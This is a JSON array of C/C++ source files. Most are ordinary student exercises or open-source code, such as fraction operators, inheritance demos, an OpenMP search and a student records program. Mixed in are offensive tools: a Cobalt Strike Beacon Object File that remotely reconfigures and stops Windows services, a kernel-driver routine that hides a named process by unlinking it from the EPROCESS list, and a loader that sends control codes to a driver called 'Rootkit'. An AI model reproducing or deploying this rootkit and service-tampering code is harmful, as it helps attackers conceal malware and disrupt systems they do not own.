[
    "//\u00cf\u00e5\u00f0\u00e5\u00e3\u00f0\u00f3\u00e7\u00ea\u00e0 \u00ee\u00ef\u00e5\u00f0\u00e0\u00f2\u00ee\u00f0\u00ee\u00e2.\n//\u00c7\u00e0\u00e4\u00e0\u00ed\u00e8\u00e5 1.\n#include <iostream>\n\nclass Fraction\n{\nprivate:\n    int numerator_;\n    int denominator_;\n\npublic:\n    Fraction(int numerator, int denominator)\n    {\n        numerator_ = numerator;\n        denominator_ = denominator;\n    }\n    bool operator==(const Fraction& other) const {\n        return numerator_ * other.denominator_ == denominator_ * other.numerator_;\n    }\n    bool operator!=(const Fraction& other) const {\n        return !(*this == other);\n    }\n    bool operator<(const Fraction& other) const {\n        return (numerator_ * other.denominator_ < denominator_ * other.numerator_);\n    }\n    bool operator>(const Fraction& other) const {\n        return (numerator_ * other.denominator_ > denominator_ * other.numerator_);\n    }\n    bool operator<=(const Fraction& other) const {\n        return (numerator_ * other.denominator_ <= denominator_ * other.numerator_);\n    }\n    bool operator>=(const Fraction& other) const {\n        return (numerator_ * other.denominator_ >= denominator_ * other.numerator_);\n    }\n};\n\nint main()\n{\n    Fraction f1(4, 3);\n    Fraction f2(6, 11);\n\n    std::cout << \"f1\" << ((f1 == f2) ? \" == \" : \" not == \") << \"f2\" << '\\n';\n    std::cout << \"f1\" << ((f1 != f2) ? \" != \" : \" not != \") << \"f2\" << '\\n';\n    std::cout << \"f1\" << ((f1 < f2) ? \" < \" : \" not < \") << \"f2\" << '\\n';\n    std::cout << \"f1\" << ((f1 > f2) ? \" > \" : \" not > \") << \"f2\" << '\\n';\n    std::cout << \"f1\" << ((f1 <= f2) ? \" <= \" : \" not <= \") << \"f2\" << '\\n';\n    std::cout << \"f1\" << ((f1 >= f2) ? \" >= \" : \" not >= \") << \"f2\" << '\\n';\n\n}",
    "//This project is heavily based on other open-source projects such as:\n//   - https://github.com/trustedsec/CS-Remote-OPs-BOF/blob/main/src/Remote/sc_config/entry.c\n//   - https://github.com/Cobalt-Strike/bof-vs\n//   - many more\n\n\n\n#include <Windows.h>\n#include \"base\\helpers.h\"\n#include \"string.h\"\n\n/**\n * For the debug build we want:\n *   a) Include the mock-up layer\n *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API\n *      is linked against the the debug build.\n */\n#ifdef _DEBUG\n#include \"base\\mock.h\"\n#undef DECLSPEC_IMPORT\n#define DECLSPEC_IMPORT\n#endif\n\nextern \"C\" {\n#include \"beacon.h\"\n    // Define the Dynamic Function Resolution declaration for the GetLastError function\n    DFR(KERNEL32, GetLastError);\n    #define GetLastError KERNEL32$GetLastError\n\n\tformatp OutputBuffer;\n\tchar lanmanBinPath[1024];\n\tchar srv2BinPath[1024];\n\tchar srvnetBinPath[1024];\n\n\tDWORD ConfigTargetService(const char* Hostname, const char* cpServiceName, const char* binpath, DWORD errmode, DWORD state)\n\t{\n\t\t\n\t\tDWORD dwResult = ERROR_SUCCESS;\n\t\tSC_HANDLE scManager = NULL;\n\t\tSC_HANDLE scService = NULL;\n\n\t\t// Open the service control manager\n\t\t//scManager = ADVAPI32$OpenSCManagerA(Hostname, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_CONNECT);\n        DFR_LOCAL(ADVAPI32, OpenSCManagerA);\n        scManager = OpenSCManagerA(Hostname, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_CONNECT);\n\t\tif (NULL == scManager)\n\t\t{\n\t\t\tdwResult = GetLastError();\n\t\t\t//BeaconPrintf(\"OpenSCManagerA failed (%lu)\\n\", dwResult);\n            BeaconPrintf(CALLBACK_OUTPUT, \"OpenSCManagerA failed (%lu)\\n\", dwResult);\n\t\t\tgoto config_service_end;\n\t\t}\n\n\t\t// Open the service\n        DFR_LOCAL(ADVAPI32, OpenServiceA);\n\t\tscService = OpenServiceA(scManager, cpServiceName, SERVICE_CHANGE_CONFIG);\n\t\tif (NULL == scService)\n\t\t{\n\t\t\tdwResult = GetLastError();\n\t\t\t//BeaconPrintf(\"OpenServiceA failed (%lu)\\n\", dwResult);\n             BeaconPrintf(CALLBACK_OUTPUT, \"OpenServiceA failed (%lu)\\n\", dwResult);\n\t\t\tgoto config_service_end;\n\t\t}\n\n\t\t// Set the service configuration\n        DFR_LOCAL(ADVAPI32, ChangeServiceConfigA);\n\t\tif (FALSE == ChangeServiceConfigA(\n\t\t\tscService,\n\t\t\tSERVICE_NO_CHANGE,\n\t\t\tstate,\n\t\t\terrmode,\n\t\t\tbinpath,\n\t\t\tNULL,\n\t\t\tNULL,\n\t\t\tNULL,\n\t\t\tNULL,\n\t\t\tNULL,\n\t\t\tNULL\n\t\t)\n\t\t\t)\n\t\t{\n\t\t\tdwResult = GetLastError();\n\t\t\t//BeaconPrintf(\"ChangeServiceConfigA failed (%lu)\\n\", dwResult);\n\t\t\tBeaconPrintf(CALLBACK_OUTPUT, \"ChangeServiceConfigA failed (%lu)\\n\", dwResult);\n\t\t\tgoto config_service_end;\n\t\t}\n\n\t\t\n\n\n\tconfig_service_end:\n\t\tDFR_LOCAL(ADVAPI32, CloseServiceHandle);\n\t\tif (scService)\n\t\t{\n            \n\t\t\tCloseServiceHandle(scService);\n\t\t\tscService = NULL;\n\t\t}\n\n\t\tif (scManager)\n\t\t{\n\t\t\tCloseServiceHandle(scManager);\n\t\t\tscManager = NULL;\n\t\t}\n\n\t\treturn dwResult;\n\t}\n\n\tDWORD StopTargetService(const char* Hostname, const char* cpServiceName)\n{\n    DWORD dwResult = ERROR_SUCCESS;\n\tSC_HANDLE scManager = NULL;\n\tSC_HANDLE scService = NULL;\n   \tSERVICE_STATUS_PROCESS ssp;\n\tDWORD dwBytesNeeded = 0;\n\n\n\t// Open the service control manager\n\tDFR_LOCAL(ADVAPI32, OpenSCManagerA);\n\tscManager = OpenSCManagerA(Hostname, SERVICES_ACTIVE_DATABASEA, SC_MANAGER_CONNECT);\n\tif (NULL == scManager)\n\t{\n\t\tdwResult = KERNEL32$GetLastError();\n\t\tBeaconPrintf(CALLBACK_OUTPUT, \"OpenSCManagerA failed (%lX)\\n\", dwResult);\n\t\tgoto stop_service_end;\n\t}\n\n\t// Open the service\n\tDFR_LOCAL(ADVAPI32, OpenServiceA);\n\tscService = OpenServiceA(scManager, cpServiceName, SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS);\n\tif (NULL == scService)\n\t{\n\t\tdwResult = KERNEL32$GetLastError();\n\t\tBeaconPrintf(CALLBACK_OUTPUT, \"OpenServiceA failed (%lX)\\n\", dwResult);\n\t\tgoto stop_service_end;\n\t}\n\n    // Get the service status process struct\n\tDFR_LOCAL(ADVAPI32, QueryServiceStatusEx);\n    if ( FALSE == QueryServiceStatusEx( \n            scService, \n            SC_STATUS_PROCESS_INFO,\n            (LPBYTE)&ssp, \n            sizeof(SERVICE_STATUS_PROCESS),\n            &dwBytesNeeded\n            )\n        )\n    {\n        dwResult = KERNEL32$GetLastError();\n\t\tBeaconPrintf(CALLBACK_OUTPUT, \"QueryServiceStatusEx failed (%lX)\\n\", dwResult);\n\t\tgoto stop_service_end;\n    }\n\n    // Check the current state of the service\n    if ( ssp.dwCurrentState == SERVICE_STOPPED )\n    {\n\t\t//print service name\n\t\tBeaconPrintf(CALLBACK_OUTPUT, \"Service: %s\\n\", cpServiceName);\n        BeaconPrintf(CALLBACK_OUTPUT, \"Service is already stopped.\\n\");\n        goto stop_service_end;\n    }\n\n    // If a stop is pending, wait for it\n    if ( ssp.dwCurrentState == SERVICE_STOP_PENDING ) \n    {\n        BeaconPrintf(CALLBACK_OUTPUT, \"Service stop pending...\\n\");\n        goto stop_service_end;\n    }\n\n    \n    // Now we can finally Send a stop code to the service\n\tDFR_LOCAL(ADVAPI32, ControlService);\n    if ( FALSE == ControlService( \n            scService, \n            SERVICE_CONTROL_STOP, \n            (LPSERVICE_STATUS) &ssp \n            )\n        )\n    {\n        dwResult = KERNEL32$GetLastError();\n\t\tBeaconPrintf(CALLBACK_OUTPUT, \"ControlService failed (%lX)\\n\", d",
    "#include <iostream>\n\nusing namespace std;\n\n\nclass SWE {\npublic:\n    void display() {\n        cout << \"I am a software student\" << endl;\n    }\n};\n\n\nclass NWS {\npublic:\n    void display() {\n        cout << \"I am a network and security student\" << endl;\n    }\n};\n\n\nclass CSN {\npublic:\n    void display() {\n        cout << \"I am a computer network and security student\" << endl;\n    }\n};\n\n//  class ICT is inheriting from SWE, NWS, and CSN respectively\nclass ICT : public SWE, public NWS, public CSN {\npublic:\n    void displayICT() {\n        cout << \"I belong to all categories: SWE, NWS and CSN\" << endl;\n    }\n};\n\nint main() {\n    // Creating objects for all the  classes\n    SWE softwareStudent;\n    NWS networkSecurityStudent;\n    CSN computerNetworkSecurityStudent;\n    ICT ictStudent;\n\n    // Calling display() for each of the classes\n    softwareStudent.display();       \n    networkSecurityStudent.display(); \n    computerNetworkSecurityStudent.display();\n    ictStudent.displayICT(); \n\n    // Calling functions of the other  classes from ICT object\n    ictStudent.SWE::display();   \n    ictStudent.NWS::display();   \n    ictStudent.CSN::display();   \n\n    return 0;\n}\n\n/*\nThis is an example of multiple inheritance, where the derived class ICT inherits from multiple base classes (SWE, NWS, and CSN).\n\nTo resolve ambiguity in calling the display function from the base classes, we explicitly specify which base class's display function we want to call using the scope resolution operator (e.g., ictStudent.SWE::display()). This resolves the conflict that arises because all three base classes have a method with the same name.\n*/\n",
    "// PageCleanups.cpp\t- Implementation of CPageCleanups\n//\n// WinDirStat - Directory Statistics\n// Copyright (C) 2003-2004 Bernhard Seifert\n//\n// This program is free software; you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation; either version 2 of the License, or\n// (at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// along with this program; if not, write to the Free Software\n// Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA\n//\n// Author: bseifert@users.sourceforge.net, bseifert@daccord.net\n//\n// Last modified: $Date: 2004/11/13 08:17:07 $\n\n#include \"stdafx.h\"\n#include \"windirstat.h\"\n#include \".\\pagecleanups.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#endif\n\nIMPLEMENT_DYNAMIC(CPageCleanups, CPropertyPage)\n\nCPageCleanups::CPageCleanups()\n\t: CPropertyPage(CPageCleanups::IDD)\n\t, m_enabled(FALSE)\n\t, m_title(_T(\"\"))\n\t, m_worksForDrives(FALSE)\n\t, m_worksForDirectories(FALSE)\n\t, m_worksForFilesFolder(FALSE)\n\t, m_worksForFiles(FALSE)\n\t, m_worksForUncPaths(FALSE)\n\t, m_recurseIntoSubdirectories(FALSE)\n\t, m_askForConfirmation(FALSE)\n\t, m_showConsoleWindow(FALSE)\n\t, m_waitForCompletion(FALSE)\n\t, m_refreshPolicy(0)\n\t, m_commandLine(_T(\"\"))\n\t, m_current(-1)\n{\n}\n\nCPageCleanups::~CPageCleanups()\n{\n}\n\nvoid CPageCleanups::DoDataExchange(CDataExchange* pDX)\n{\n\tCPropertyPage::DoDataExchange(pDX);\n\tDDX_Control(pDX, IDC_LIST, m_list);\n\tDDX_Check(pDX, IDC_ENABLED, m_enabled);\n\tDDX_Text(pDX, IDC_TITLE, m_title);\n\tDDX_Check(pDX, IDC_WORKSFORDRIVES, m_worksForDrives);\n\tDDX_Check(pDX, IDC_WORKSFORDIRECTORIES, m_worksForDirectories);\n\tDDX_Check(pDX, IDC_WORKSFORFILESFOLDER, m_worksForFilesFolder);\n\tDDX_Check(pDX, IDC_WORKSFORFILES, m_worksForFiles);\n\tDDX_Check(pDX, IDC_WORKSFORUNCPATHS, m_worksForUncPaths);\n\tDDX_Text(pDX, IDC_COMMANDLINE, m_commandLine);\n\tDDX_Check(pDX, IDC_RECURSEINTOSUBDIRECTORIES, m_recurseIntoSubdirectories);\n\tDDX_Check(pDX, IDC_ASKFORCONFIRMATION, m_askForConfirmation);\n\tDDX_Check(pDX, IDC_SHOWCONSOLEWINDOW, m_showConsoleWindow);\n\tDDX_Check(pDX, IDC_WAITFORCOMPLETION, m_waitForCompletion);\n\tDDX_Control(pDX, IDC_REFRESHPOLICY, m_ctlRefreshPolicy);\n\tDDX_CBIndex(pDX, IDC_REFRESHPOLICY, m_refreshPolicy);\n\n\tDDX_Control(pDX, IDC_TITLE, m_ctlTitle);\n\tDDX_Control(pDX, IDC_WORKSFORDRIVES, m_ctlWorksForDrives);\n\tDDX_Control(pDX, IDC_WORKSFORDIRECTORIES, m_ctlWorksForDirectories);\n\tDDX_Control(pDX, IDC_WORKSFORFILESFOLDER, m_ctlWorksForFilesFolder);\n\tDDX_Control(pDX, IDC_WORKSFORFILES, m_ctlWorksForFiles);\n\tDDX_Control(pDX, IDC_WORKSFORUNCPATHS, m_ctlWorksForUncPaths);\n\tDDX_Control(pDX, IDC_COMMANDLINE, m_ctlCommandLine);\n\tDDX_Control(pDX, IDC_RECURSEINTOSUBDIRECTORIES, m_ctlRecurseIntoSubdirectories);\n\tDDX_Control(pDX, IDC_ASKFORCONFIRMATION, m_ctlAskForConfirmation);\n\tDDX_Control(pDX, IDC_SHOWCONSOLEWINDOW, m_ctlShowConsoleWindow);\n\tDDX_Control(pDX, IDC_WAITFORCOMPLETION, m_ctlWaitForCompletion);\n\tDDX_Control(pDX, IDC_HINTSP, m_ctlHintSp);\n\tDDX_Control(pDX, IDC_HINTSN, m_ctlHintSn);\n\tDDX_Control(pDX, IDC_UP, m_ctlUp);\n\tDDX_Control(pDX, IDC_DOWN, m_ctlDown);\n}\n\n\nBEGIN_MESSAGE_MAP(CPageCleanups, CPropertyPage)\n\tON_LBN_SELCHANGE(IDC_LIST, OnLbnSelchangeList)\n\tON_BN_CLICKED(IDC_ENABLED, OnBnClickedEnabled)\n\tON_EN_CHANGE(IDC_TITLE, OnEnChangeTitle)\n\tON_BN_CLICKED(IDC_WORKSFORDRIVES, OnBnClickedWorksfordrives)\n\tON_BN_CLICKED(IDC_WORKSFORDIRECTORIES, OnBnClickedWorksfordirectories)\n\tON_BN_CLICKED(IDC_WORKSFORFILESFOLDER, OnBnClickedWorksforfilesfolder)\n\tON_BN_CLICKED(IDC_WORKSFORFILES, OnBnClickedWorksforfiles)\n\tON_BN_CLICKED(IDC_WORKSFORUNCPATHS, OnBnClickedWorksforuncpaths)\n\tON_EN_CHANGE(IDC_COMMANDLINE, OnEnChangeCommandline)\n\tON_BN_CLICKED(IDC_RECURSEINTOSUBDIRECTORIES, OnBnClickedRecurseintosubdirectories)\n\tON_BN_CLICKED(IDC_ASKFORCONFIRMATION, OnBnClickedAskforconfirmation)\n\tON_BN_CLICKED(IDC_SHOWCONSOLEWINDOW, OnBnClickedShowconsolewindow)\n\tON_BN_CLICKED(IDC_WAITFORCOMPLETION, OnBnClickedWaitforcompletion)\n\tON_CBN_SELENDOK(IDC_REFRESHPOLICY, OnCbnSelendokRefreshpolicy)\n\tON_BN_CLICKED(IDC_UP, OnBnClickedUp)\n\tON_BN_CLICKED(IDC_DOWN, OnBnClickedDown)\n\tON_BN_CLICKED(IDC_HELPBUTTON, OnBnClickedHelpbutton)\nEND_MESSAGE_MAP()\n\n\n\nBOOL CPageCleanups::OnInitDialog()\n{\n\tCPropertyPage::OnInitDialog();\n\n\t// Combobox data correspond to enum REFRESHPOLICY:\n\tm_ctlRefreshPolicy.AddString(LoadString(IDS_POLICY_NOREFRESH));\n\tm_ctlRefreshPolicy.AddString(LoadString(IDS_POLICY_REFRESHTHISENTRY));\n\tm_ctlRefreshPolicy.AddString(LoadString(IDS_POLICY_REFRESHPARENT));\n\t// We don't do this: m_ctlRefreshPolicy.AddString(\"Assume entry has been deleted\");\n\t// That conflicts with \"works for <Files> Pseudoentries\".\n\n\tGetOptions()->GetUserD",
    "#include <iostream>\n#include \"Header.h\"\nusing namespace std;\n\nclass A\n{\n    int a;\n\npublic:\n    A(int n = 3)\n    {\n        a = n;\n        std::cout << \"Parametered Constructor\\n\\n\";\n    }\n    A(const A &obj)\n    {\n        std::cout << \"Copy Constructor\\n\\n\";\n    }\n    int getA()\n    {\n        return a;\n    }\n    void operator=(const A &obj)\n    {\n        std::cout << \"Assignment Operator\\n\\n\";\n    }\n    A myFunc(A obj)\n    {\n\n        A ans;\n        ans.a = obj.a;\n        return ans;\n    }\n    void setA(int);\n    ~A()\n    {\n        std::cout << \"Destructor\\n\\n\";\n    }\n};\nvoid A::setA(int a)\n{\n    this->a = a;\n\n    // *(this).a or this->;a\n    // \"this\" is a pointer of an object that points to itself\n}\n\nint main()\n{\n    A obj1, obj2 = obj1;\n    A obj3;\n    obj3 = obj2.myFunc(obj1);\n\n    A a, b;\n    a = b; // Return type void for binary operator\n    // a = b = c ; Return type obj for Tertiary Operator\n\n    // Objects to Pointers\n    A obja;\n    A *objptr;\n    objptr = &obja;\n\n    // Dynamic Declaration of classes with pointers\n    // Declare all dynamically\n    // use ->; instead of . in main\n    // Delete everything\n}",
    "/*\n*   Busca Paralela em Vetor\n*\n*   Implemente um programa que realize a busca de um valor espec\u00edfico em um vetor de inteiros utilizando\n*   #pragma omp for para paralelizar a busca. Al\u00e9m disso, use #pragma omp single para imprimir a posi\u00e7\u00e3o\n*   do valor encontrado na primeira ocorr\u00eancia, garantindo que apenas uma thread execute a impress\u00e3o.\n*   Utilize uma vari\u00e1vel compartilhada para armazenar a posi\u00e7\u00e3o do valor encontrado e uma cl\u00e1usula\n*   #pragma omp critical para proteger a atualiza\u00e7\u00e3o desta vari\u00e1vel.\n*/\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <omp.h>\n#include <time.h>\n\nint main() {\n    const int TAM = 100;\n    int a[TAM];\n    int valor_procurado = 5;\n    int posicao_encontrada = -1;\n\n    srand(time(NULL));\n\n    for (int i = 0; i < TAM; i++) {\n        a[i] = rand() % 10;\n    }\n\n    #pragma omp parallel shared(posicao_encontrada)\n    {\n        #pragma omp for\n        for (int i = 0; i < TAM; i++) {\n            if (a[i] == valor_procurado) {\n                #pragma omp critical\n                {\n                    if (posicao_encontrada == -1) {\n                        posicao_encontrada = i;\n                    }\n                }\n            }\n        }\n\n        #pragma omp single\n        {\n            if (posicao_encontrada != -1) {\n                printf(\"Valor %d encontrado na posi\u00e7\u00e3o %d\\n\", valor_procurado, posicao_encontrada);\n            } else {\n                printf(\"Valor %d n\u00e3o encontrado no vetor\\n\", valor_procurado);\n            }\n        }\n    }\n\n    return 0;\n}\n",
    "#include <ntddk.h>\n#include <ntstrsafe.h>\n#include \"Offset.h\"\n#include \"Hide.h\"\n\nextern \"C\"\nstatic ULONG pidOffset = 0, nameOffset = 0, listEntryOffset = 0;\n\nextern \"C\"\nBOOLEAN InitializeOffsets()\n{\n\n\tnameOffset = CalcProcessNameOffset();\n\tpidOffset = CalcPIDOffset();\t\t\t\t\t// PID\n\tlistEntryOffset = pidOffset + sizeof(HANDLE);\t// LIST_ENTRY\n\n\tif (pidOffset == 0 || nameOffset == 0)\n\t\treturn FALSE;\n\telse\n\t{\n\t\tDbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, \"NameOffset Address: 0x%X\\n\", nameOffset);\n\t\tDbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, \"PID Address: 0x%X\\n\", pidOffset);\n\t\tDbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, \"ListEntry Address: 0x%X\\n\", listEntryOffset);\n\t\treturn TRUE;\n\t}\n}\n\nextern \"C\"\nVOID HideProcess()\n{\n\tPLIST_ENTRY head, currentNode, prevNode;\n\tPEPROCESS eprocessStart;\n\tunsigned char* currentProcess = NULL;\n\tconst char target[] = \"pcom5.exe\"; // Change Name of Process to Usermode Process...\n\tANSI_STRING targetProcessName, currentProcessName;\n\n\teprocessStart = IoGetCurrentProcess();\n\thead = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);\n\tRtlInitAnsiString(&targetProcessName, target);\n\n\tdo\n\t{\n\t\tcurrentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);\n\t\tRtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));\n\n\t\t//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"Process String: %s\\n\", currentProcessName.Buffer);\n\t\t//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"Target Process: %s\\n\", targetProcessName.Buffer);\n\t\tif (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)\n\t\t{\n\t\t\t//DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, \"Found target process %s.\\n\", target);\n\n\t\t\t// (A->B->C->) to (A->C)\n\t\t\tprevNode = currentNode->Blink;\n\t\t\tprevNode->Flink = currentNode->Flink;\n\n\t\t\t// (A<-B<-C<-) to (A<-C)\n\t\t\tcurrentNode->Flink->Blink = prevNode;\n\n\t\t\t// TargetProcess\n\t\t\tcurrentNode->Flink = currentNode;\n\t\t\tcurrentNode->Blink = currentNode;\n\t\t\tbreak;\n\t\t}\n\n\t\tcurrentNode = currentNode->Flink;\n\t} while (currentNode->Flink != head);\n\t// EPROCESS\n}",
    "#include <iostream>\n#include <map>\nusing namespace std;\n\n\n// Defining struct Students \nstruct student{\n\n      int studentRollNo;\n      string studentName;\n      string studentFatherName;\n      string studentDOB;\n      string studentBranch;\n      int studentYear;\n      int passingYear;\n      string studentState;\n      int PIN;\n      string studentCountry;\n};\n\n// Function Prototype/Signature for search the student\nvoid updateStudentByDetail(student *ptr);\n\n// Function prototype/signature for searching the desired student\nstudent* searchStudentIfExist(student *ptr, int studentCount,int rollNumber);\n\n// Function Prototype for creating report on student details\nvoid generateReport(student *rptr, int count);\n\n\nint main(){\n\n          student ptr[100];\n          char deleteChoice;\n          student *searchptr;\n          int getPosition;\n          int choice = 0, count = 0, updateStudentRoll = 0;\n\n          cout << endl << \"Welcome to Student Management System\";\n          while (choice != 5){\n\n                  cout << endl << endl << \"1. Add new student to the list. \" << endl;\n                  cout << \"2. Update the record.\" << endl;\n                  cout << \"3. Delete the record.\" << endl;\n                  cout << \"4. Generate the report.\" << endl;\n                  cout << \"5. Exit the system.\" << endl;\n                  cout << \"Enter you choice: \";\n                  cin >> choice;\n\n                  switch (choice){\n\n                        case 1: \n\n                              if (count <= 99){\n\n                                    cout << endl << \"Enter student Roll Number: \";\n                                    cin >> (ptr + count)->studentRollNo;\n                                    cin.ignore();\n                                    cout << \"Enter Student Name: \";\n                                    getline(cin,(ptr + count)->studentName);\n                                    cout << \"Enter Father's Name: \";\n                                    getline(cin,(ptr + count)->studentFatherName);\n                                    cout << \"Enter Student DOB: \";\n                                    getline(cin,(ptr + count)->studentDOB);\n                                    cout << \"Enter student branch: \";\n                                    getline(cin,(ptr + count)->studentBranch);\n                                    cout << \"Enter student joining year: \";\n                                    cin >> (ptr + count)->studentYear;\n                                    cout << \"Enter student passing year: \";\n                                    cin >> (ptr + count)->passingYear;\n                                    cin.ignore();\n                                    cout << \"Enter student state: \";\n                                    getline(cin,(ptr + count)->studentState);\n                                    cout << \"Enter student PINCODE: \";\n                                    cin >> (ptr + count)->PIN;\n                                    cin.ignore();\n                                    cout << \"Enter student country: \";\n                                    getline(cin,(ptr + count)->studentCountry);\n                                    count++;\n                                    cout << \"Thanks! \"<< count << \" student(s) has been added to the system\" << endl;\n                                    break;\n                              }\n                              else{\n                                    cout << \"Maximum records capacity has reached\" << endl;\n                                    break;\n                              }\n\n                        case 2:\n\n                              if ((count > 0) && (count <= 99)){\n                                    cout << endl << \"Search for student\\n\";\n                                    cout << \"Enter student roll number: \";\n                                    cin >> updateStudentRoll;\n                                    searchptr = searchStudentIfExist(ptr,count,updateStudentRoll);\n                                    if (searchptr != nullptr){\n                                          cout << \"Ok got it!, what do you want to update for this student ?\" << endl;\n                                          updateStudentByDetail(searchptr);\n                                          break;\n                                    }\n                                    else {\n                                          cout << \"No Match found with this roll number\";\n                                          break;\n                                    }\n                              }\n                              else {\n                                    cout << \"Currently there are no students records in the database\";\n                                    break;\n                              }\n\n                        case 3:\n\n                              if (count!= 0){\n                                    cout << endl << \"Delete student record\\n\";\n                                 ",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <regex>\n#include <sstream>\n#include <algorithm>\n#include <cmath>\n#include <unordered_set>\n#include <list>\n#include <stdio.h>\n#include <ctype.h>\n#include <cstring>\n#include <cctype>\n#include <iomanip>\n#include <climits>\n#include <functional>\n#include <cstdlib>\n#include <ctime>\n#include <cstdio>\n#include <stack>\n#include <queue>\n#include <deque>\n#include <map>\n#include <set>\n#include <bitset>\n#include <complex>\n#include <random>\n \nusing namespace std;\ntypedef long long ll;\n#define endl \"\\n\";\n#define loop(i,a,b) for (int i = a; i < b; ++i)\n// getline(cin, s);\n// freopen(\"input.txt\", \"r\", stdin);\n// freopen(\"output.txt\", \"w\", stdout);\n \n// Problem Link: https://cses.fi/problemset/task/1094\nint main() {\n    ios::sync_with_stdio(0);\n    cin.tie(0);\n    ll N; cin >> N; ll x, out = 0, last = 0;\n    loop (i,0,N) {\n        cin >> x;\n        if (x > last) {\n            last = x;\n        } else {\n            out += last - x;\n        }\n    }\n    cout << out << endl;\n",
    "\ufeff#include \"loader.h\"\n\n#define SERVICE \"Rootkit\"\n#define DEVICE \"\\\\\\\\.\\\\Rootkit\"\n//#define DRIVER \"c:\\\\\\\\Windows\\\\System32\\\\drivers\\\\Rootkit.sys\"\n#define DRIVER \"c:\\\\\\\\Users\\\\admin\\\\Desktop\\\\Rootkit.sys\"\n//#define DRIVER \"C:\\\\\\\\WINDOWS\\\\Rootkit.sys\"\n\n\n// IRP code that will call our rootkit functionality\n#define IRP_ROOTKIT_CODE 0x815\n#define IOCTL_SEND_TEXT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)\n\nint call_kernel_driver(HANDLE hDevice) {\n\n    //printf(\"%s %d\\n\", \"[+] Calling Driver, hiding PID:\", atoi(pid));\n    //char comand = 'C';\n    //char* pid = &comand;\n    //ULONG bytes_returned;\n    //char* retbuf;\n\n    //BOOLEAN call_result = DeviceIoControl(\n    //    hDevice,\n    //    IRP_ROOTKIT_CODE,\n    //    pid,\n    //    strlen(pid) + 1,\n    //    retbuf,\n    //    200,\n    //    &bytes_returned,\n    //    (LPOVERLAPPED)NULL);\n\n\n    \n    ULONG btnCode = 0x41;\n    char retbuf = ' ';\n\n    DWORD bytesReturned;\n    BOOL bResult = DeviceIoControl(\n        hDevice,                        // \u0414\u0435\u0441\u043a\u0440\u0438\u043f\u0442\u043e\u0440 \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u0430\n        IRP_ROOTKIT_CODE,            // \u0423\u043f\u0440\u0430\u0432\u043b\u044f\u044e\u0449\u0438\u0439 \u043a\u043e\u0434 \u0432\u0432\u043e\u0434\u0430-\u0432\u044b\u0432\u043e\u0434\u0430\n        &btnCode,                       // \u0411\u0443\u0444\u0435\u0440 \u0432\u0432\u043e\u0434\u0430 (\u043a\u043e\u0434 \u043a\u043b\u0430\u0432\u0438\u0448\u0438)\n        sizeof(btnCode),               // \u0420\u0430\u0437\u043c\u0435\u0440 \u0431\u0443\u0444\u0435\u0440\u0430 \u0432\u0432\u043e\u0434\u0430\n        NULL,                           // \u0411\u0443\u0444\u0435\u0440 \u0432\u044b\u0432\u043e\u0434\u0430 (\u043d\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f)\n        0,                              // \u0420\u0430\u0437\u043c\u0435\u0440 \u0431\u0443\u0444\u0435\u0440\u0430 \u0432\u044b\u0432\u043e\u0434\u0430 (\u043d\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f)\n        &bytesReturned,                 // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0435\u043d\u043d\u044b\u0445 \u0431\u0430\u0439\u0442 (\u043d\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f)\n        NULL                            // \u0423\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 OVERLAPPED (NULL \u0434\u043b\u044f \u0441\u0438\u043d\u0445\u0440\u043e\u043d\u043d\u043e\u0439 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438)\n    );\n\n\n    //char text[] = \"helloworld\";\n    //DWORD bytesReturned;\n    //   // \u0412\u044b\u0437\u043e\u0432 DeviceIoControl \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0438 \u0442\u0435\u043a\u0441\u0442\u0430 \"helloworld\"\n    //BOOL bResult = DeviceIoControl(\n    //    hDevice,                        // \u0414\u0435\u0441\u043a\u0440\u0438\u043f\u0442\u043e\u0440 \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u0430\n    //    IOCTL_SEND_TEXT,                // \u0423\u043f\u0440\u0430\u0432\u043b\u044f\u044e\u0449\u0438\u0439 \u043a\u043e\u0434 \u0432\u0432\u043e\u0434\u0430-\u0432\u044b\u0432\u043e\u0434\u0430\n    //    text,                           // \u0411\u0443\u0444\u0435\u0440 \u0432\u0432\u043e\u0434\u0430\n    //    sizeof(text),                   // \u0420\u0430\u0437\u043c\u0435\u0440 \u0431\u0443\u0444\u0435\u0440\u0430 \u0432\u0432\u043e\u0434\u0430\n    //    